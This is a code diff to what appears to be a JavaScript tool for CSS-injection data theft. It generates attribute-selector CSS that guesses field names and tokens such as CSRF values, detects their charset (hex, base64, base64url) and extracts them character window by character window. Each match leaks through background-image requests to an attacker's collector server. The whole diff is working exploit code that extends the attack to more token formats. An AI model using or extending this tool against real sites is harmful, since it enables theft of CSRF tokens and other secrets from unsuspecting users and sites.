@@ -7,11 +7,14 @@
 //   1. Recon. Wordlist probes report which fields exist (CSS can't enumerate
 //      attribute names or read values, so names can only be guessed), whether
 //      their element renders a usable host for background requests, and
-//      whether the value looks like lowercase hex.
+//      which charset the value looks like.
 //
 //        GET /r/i/csrf     an <input name="csrf"> exists (any case)
 //        GET /r/if/csrf    ...and it's a direct child of a rendered <form>
 //        GET /r/ih/csrf    ...and its value is lowercase hex only
+//        GET /r/ib/csrf    ...and its value only has base64 chars
+//        GET /r/iw/csrf    ...and its value only has base64url chars
+//                          (both: alphanumeric)
 //
 //   2. Extract. For each chosen field, the usual frag window rules, but with
 //      every URL namespaced by field so the server can tell fields apart
@@ -22,14 +25,18 @@
 //        GET /b/0/e/ab     field 0's value ends with "ab" (URL params: one
 //                          of several candidate ends)
 //        GET /b/0/r/ab     (URL params) some param value starts with "ab"
+//        GET /b/0/c/aB     (non-hex charsets) field 0's value contains "aB",
+//                          case-sensitively; the windows above are then
+//                          case-insensitive (see public/payload.js)
 //
 // Rules are built as data ({ scope, match, prop, path }) and rendered to CSS
 // separately, so tests can evaluate exactly the rules the CSS is made from.
 (function (root) {
   const P = typeof module !== 'undefined' && module.exports ? require('./payload') : root;
   const {
-    ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex,
-    attributeValue, collectorURL, backgroundList,
+    ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allWindows,
+    attributeTest, collectorURL, backgroundList, charsetOf, windowSizeFor, caseBigrams, caseBigramCount,
+    pathChunk,
   } = P;
 
   // --- wordlists ---------------------------------------------------------------
@@ -87,13 +94,19 @@
     i: INPUT_NAMES, // input exists
     if: INPUT_NAMES, // ...and its form renders (it's the extraction host)
     ih: INPUT_NAMES, // ...and its value is lowercase hex
+    ib: INPUT_NAMES, // ...and its value only has base64 chars
+    iw: INPUT_NAMES, // ...and its value only has base64url chars
     m: META_NAMES, // meta exists (and renders, which always works)
     mh: META_NAMES, // ...and its content is lowercase hex
+    mb: META_NAMES, // ...base64
+    mw: META_NAMES, // ...base64url
     a: URL_PARAMS, // a link has ?name= or &name=
     f: URL_PARAMS, // a form action has ?name= or &name=
     d: DATA_ATTRS, // an element has the data attribute
     ds: DATA_ATTRS, // ...and that element renders (it's the extraction host)
     dh: DATA_ATTRS, // ...and its value is lowercase hex
+    db: DATA_ATTRS, // ...base64
+    dw: DATA_ATTRS, // ...base64url
     iu: ['x'], // a hidden input whose name isn't in INPUT_NAMES exists
   };
 
@@ -109,13 +122,35 @@
     form: { names: URL_PARAMS, hosts: ['self'], whole: false },
   };
 
-  // A value is lowercase hex if it's non-empty and contains none of these.
-  // `i` makes g-z cover G-Z too; A-F need their own case-sensitive tests.
-  const NON_HEX = [
-    ...[...'ghijklmnopqrstuvwxyz'].map(c => [c, true]),
-    ...[...'ABCDEF'].map(c => [c, false]),
-    ...[...'-_.,/+=:;~%!@#$&*()[]{}| '].map(c => [c, false]),
-  ];
+  // A value is in a charset if it's non-empty and contains none of that
+  // charset's rejected chars ([char, caseInsensitive]). CSS can't test for
+  // "only these chars", so this is a list of common chars that rule it out.
+  // For hex, `i` makes g-z cover G-Z too; A-F need case-sensitive tests.
+  // A value that passes both base64 and base64url has none of -_/+= and is
+  // plain alphanumeric, so alphanumeric needs no probes of its own.
+  const OTHER = [...'.,:;~%!@#$&*()[]{}|?^<>"\'` '].map(c => [c, false]);
+  // Chars only some charsets reject; every charset also rejects OTHER.
+  const CHARSET_REJECT = {
+    hex: [
+      ...[...'ghijklmnopqrstuvwxyz'].map(c => [c, true]),
+      ...[...'ABCDEF'].map(c => [c, false]),
+      ...[...'-_/+='].map(c => [c, false]),
+    ],
+    base64: [...'-_'].map(c => [c, false]),
+    base64url: [...'/+='].map(c => [c, false]),
+  };
+  // Recon kind suffix for each probed charset.
+  const CHARSET_PROBES = [['h', 'hex'], ['b', 'base64'], ['w', 'base64url']];
+
+  // The charset recon detected from which probes fired (most specific
+  // first): false if none, i.e. the value has chars none of them allow.
+  function detectedCharset(has) {
+    if (has('h')) return 'hex';
+    if (has('b') && has('w')) return 'alnum';
+    if (has('b')) return 'base64';
+    if (has('w')) return 'base64url';
+    return false;
+  }
 
   // --- matches and rules -------------------------------------------------------
 
@@ -126,8 +161,7 @@
 
   function renderTest([name, op, value, ci]) {
     if (!op) return `[${name}]`;
-    const v = attributeValue(value);
-    return `[${name}${op}${v}${ci ? (v.startsWith('"') ? 'i' : ' i') : ''}]`;
+    return attributeTest(name, op, value, ci);
   }
 
   // `wrap` moves every attribute test inside :is(), leaving only the tag at
@@ -224,9 +258,12 @@
     return `<style>${css.join('')}</style>`;
   }
 
-  const hexOnly = attr => ({
+  const rejects = (attr, list) => list.map(([c, ci]) => [attr, '*=', c, ci]);
+  // Non-empty and none of the common rejects: true of a value in any charset.
+  const anyCharset = attr => ({ attrs: [[attr]], not: [[attr, '=', ''], ...rejects(attr, OTHER)] });
+  const charsetOnly = (attr, charset) => ({
     attrs: [[attr]],
-    not: [[attr, '=', ''], ...NON_HEX.map(([c, ci]) => [attr, '*=', c, ci])],
+    not: [[attr, '=', ''], ...rejects(attr, CHARSET_REJECT[charset]), ...rejects(attr, OTHER)],
   });
   const withTests = (m, extra) => ({
     tag: m.tag,
@@ -265,14 +302,17 @@
         probe('html', 'html', inputMatch(w), 'i', w);
         probe('form', 'form', inputMatch(w), 'if', w);
       });
-      // The long hex-only test is identical for every name. Factor it into
+      // Each long charset test is identical for every name. Factor it into
       // one parent rule; these probes have distinct properties, so moving
       // them together does not change cascade order or the requests.
-      const group = { tag: 'input', ...hexOnly('value') };
-      INPUT_NAMES.forEach(w => {
-        const test = { attrs: inputMatch(w).attrs };
-        probe('html', 'html', withTests(inputMatch(w), hexOnly('value')), 'ih', w, group, test);
-      });
+      for (const [suffix, charset] of CHARSET_PROBES) {
+        const only = charsetOnly('value', charset);
+        const group = { tag: 'input', ...only };
+        INPUT_NAMES.forEach(w => {
+          const test = { attrs: inputMatch(w).attrs };
+          probe('html', 'html', withTests(inputMatch(w), only), 'i' + suffix, w, group, test);
+        });
+      }
       probe('html', 'html', {
         tag: 'input',
         attrs: [['type', '=', 'hidden', true]],
@@ -283,11 +323,15 @@
       META_NAMES.forEach(w => {
         probe('meta', 'self', metaMatch(w), 'm', w);
       });
-      const group = { tag: 'meta', ...hexOnly('content') };
-      META_NAMES.forEach(w => {
-        const test = { attrs: metaMatch(w).attrs };
-        probe('meta', 'self', withTests(metaMatch(w), hexOnly('content')), 'mh', w, group, test);
-      });
+      for (const [suffix, charset] of CHARSET_PROBES) {
+        const only = charsetOnly('content', charset);
+        const group = { tag: 'meta', ...only };
+        META_NAMES.forEach(w => {
+          // The parent already requires a non-empty content attribute.
+          const test = { attrs: [['name', '=', w, true]] };
+          probe('meta', 'self', withTests(metaMatch(w), only), 'm' + suffix, w, group, test);
+        });
+      }
     }
     if (targets.has('url')) {
       URL_PARAMS.forEach(w => {
@@ -299,7 +343,13 @@
       DATA_ATTRS.forEach(w => {
         probe('html', 'html', dataMatch(w), 'd', w);
         probe('data', 'self', dataMatch(w), 'ds', w);
-        probe('html', 'html', withTests(dataMatch(w), hexOnly(w)), 'dh', w);
+        // Each attribute's charset probes share the common rejects in one
+        // parent rule, nesting only their own (`html:has(&:not(...))`).
+        const group = anyCharset(w);
+        for (const [suffix, charset] of CHARSET_PROBES) {
+          const test = { not: rejects(w, CHARSET_REJECT[charset]) };
+          probe('html', 'html', withTests(dataMatch(w), charsetOnly(w, charset)), 'd' + suffix, w, group, test);
+        }
       });
     }
 
@@ -317,22 +367,25 @@
 
   const generateReconCSS = (cfg, server) => render(reconPayload(cfg), server);
 
-  // Turns the set of recon hits ("kind/name") into extractable fields.
+  // Turns the set of recon hits ("kind/name") into extractable fields. Each
+  // field's `charset` is the one recon detected, false if the value fits none,
+  // or null for URL params (their values aren't probed).
   function fieldsFromRecon(hits) {
     const has = (kind, name) => hits.has(`${kind}/${name}`);
+    const charset = (prefix, name) => detectedCharset(suffix => has(prefix + suffix, name));
     const fields = [];
     for (const w of INPUT_NAMES) {
-      if (has('i', w)) fields.push({ kind: 'input', name: w, host: has('if', w) ? 'form' : 'html', hex: has('ih', w) });
+      if (has('i', w)) fields.push({ kind: 'input', name: w, host: has('if', w) ? 'form' : 'html', charset: charset('i', w) });
     }
     for (const w of META_NAMES) {
-      if (has('m', w)) fields.push({ kind: 'meta', name: w, host: 'self', hex: has('mh', w) });
+      if (has('m', w)) fields.push({ kind: 'meta', name: w, host: 'self', charset: charset('m', w) });
     }
     for (const w of URL_PARAMS) {
-      if (has('a', w)) fields.push({ kind: 'a', name: w, host: 'self', hex: null });
-      if (has('f', w)) fields.push({ kind: 'form', name: w, host: 'self', hex: null });
+      if (has('a', w)) fields.push({ kind: 'a', name: w, host: 'self', charset: null });
+      if (has('f', w)) fields.push({ kind: 'form', name: w, host: 'self', charset: null });
     }
     for (const w of DATA_ATTRS) {
-      if (has('d', w)) fields.push({ kind: 'data', name: w, host: has('ds', w) ? 'self' : 'html', hex: has('dh', w) });
+      if (has('d', w)) fields.push({ kind: 'data', name: w, host: has('ds', w) ? 'self' : 'html', charset: charset('d', w) });
     }
     return { fields, unlistedInputs: has('iu', 'x') };
   }
@@ -358,7 +411,8 @@
   }
 
   // Each kind of host is one element (plus its ::before/::after), so it can
-  // only carry so many layers: one 4-char field, or ~16 3-char fields.
+  // only carry so many layers: one 4-char hex field or one non-hex field, or
+  // ~16 3-char hex fields.
   const HOST_CAPACITY = MAX_LAYERS_PER_BOX * (1 + PSEUDO_BOXES.length);
   const WHOLE_KINDS = new Set(['input', 'meta', 'data']);
   // Hosts each kind can fall back to when its preferred one is full: any
@@ -366,11 +420,13 @@
   const FALLBACK_HOSTS = { input: ['form', 'html'], data: ['self', 'html'] };
 
   function layersFor(field) {
-    const k = Number(field.windowSize) === 3 ? 3 : 4;
-    const anchors = 16 ** ANCHOR_LENGTH;
-    // start + windows + end, and for URL params the per-value "&" ends, the
-    // "#" end and the run starts.
-    return 16 ** k + 2 + (WHOLE_KINDS.has(field.kind) ? 0 : 2 * anchors + 1);
+    const cs = charsetOf(field.charset);
+    const k = windowSizeFor(field.charset, field.windowSize);
+    const anchors = cs.fold.length ** ANCHOR_LENGTH;
+    // start + windows + case pairs + end, and for URL params the per-value
+    // "&" ends, the "#" end and the run starts.
+    return cs.fold.length ** k + caseBigramCount(cs) + 2 +
+      (WHOLE_KINDS.has(field.kind) ? 0 : 2 * anchors + 1);
   }
 
   function hostKey(field) {
@@ -392,8 +448,8 @@
       const host = options.find(h => (used.get(hostKey({ ...field, host: h })) || 0) + need <= HOST_CAPACITY);
       if (!host) {
         return {
-          error: `no room for ${field.name}: each kind of element can carry one 4-char field ` +
-            '(or ~16 3-char ones). Use 3-char windows or extract it in a separate pass.',
+          error: `no room for ${field.name}: each kind of element can carry one 4-char hex or ` +
+            'non-hex field (or ~16 3-char hex ones). Use 3-char hex windows or extract it in a separate pass.',
         };
       }
       const key = hostKey({ ...field, host });
@@ -403,7 +459,7 @@
     return { fields: out };
   }
 
-  // Each field: { id, kind, name, host, windowSize }. Field ids namespace the
+  // Each field: { id, kind, name, host, windowSize, charset }. Field ids namespace the
   // URLs; the props share one counter so fields never clash. Rules retain full
   // matches for evaluation; group/test also express them as nested CSS.
   //
@@ -419,7 +475,10 @@
     let displayMeta = false;
     for (const field of fields) {
       const { match, attr, whole } = fieldTarget(field);
-      const k = Number(field.windowSize) === 3 ? 3 : 4;
+      const cs = charsetOf(field.charset);
+      const k = windowSizeFor(field.charset, field.windowSize);
+      // Non-hex windows and anchors are case-insensitive; case pairs aren't.
+      const ci = cs.cased;
       const scope = field.host === 'form' || field.host === 'html' ? field.host : 'self';
       const id = field.id;
       const key = hostKey(field);
@@ -432,29 +491,36 @@
         props.add(prop);
       };
 
-      for (const a of allHex(ANCHOR_LENGTH)) {
-        if (whole) rule([attr, '^=', a], `s${id}-`, 's/' + a);
+      const anchors = allWindows(cs.fold, ANCHOR_LENGTH);
+      for (const a of anchors) {
+        if (whole) rule([attr, '^=', a, ci], `s${id}-`, 's/' + pathChunk(a));
         else {
           // Both separators set the same property and URL at the same
           // specificity, so one :is() retains both probes and their order.
           const test = { is: [...'?&'].map(sep => [attr, '*=', `${sep}${field.name}=${a}`, true]) };
           rules.push({ scope, match: { tag: match.tag, ...test }, group: match,
-            test, prop: `s${id}-`, path: `b/${id}/s/${a}` });
+            test, prop: `s${id}-`, path: `b/${id}/s/${pathChunk(a)}` });
           props.add(`s${id}-`);
         }
       }
-      for (const w of allHex(k)) rule([attr, '*=', w], shortName(n++), w);
-      for (const a of allHex(ANCHOR_LENGTH)) {
-        rule([attr, '$=', a], `e${id}-`, 'e/' + a);
+      for (const w of allWindows(cs.fold, k)) rule([attr, '*=', w, ci], shortName(n++), pathChunk(w));
+      for (const p of caseBigrams(cs)) rule([attr, '*=', p], shortName(n++), 'c/' + pathChunk(p));
+      for (let i = 0; i < anchors.length; i++) {
+        const a = anchors[i];
+        const path = pathChunk(a);
+        rule([attr, '$=', a, ci], `e${id}-`, 'e/' + path);
         // A URL param usually ends at the next "&" (or "#"), but other params
         // end there too, so each candidate end gets its own property and they
         // all reach the server rather than only the last matching rule.
         if (!whole) {
-          rule([attr, '*=', a + '&'], `e${id}-${a}`, 'e/' + a);
-          rule([attr, '*=', a + '#'], `f${id}-`, 'e/' + a);
+          // Base64's "+/=" cannot appear in property names; use the anchor's
+          // index with a trailing "_", which base64 itself never contains.
+          const prop = /^[\w-]+$/.test(a) ? a : i.toString(36) + '_';
+          rule([attr, '*=', a + '&', ci], `e${id}-${prop}`, 'e/' + path);
+          rule([attr, '*=', a + '#', ci], `f${id}-`, 'e/' + path);
           // Where every param value starts, so the solver can tell whole junk
           // params from a token spliced into one.
-          rule([attr, '*=', '=' + a], `r${id}-${a}`, 'r/' + a);
+          rule([attr, '*=', '=' + a, ci], `r${id}-${prop}`, 'r/' + path);
         }
       }
       if (field.kind === 'meta') displayMeta = true;
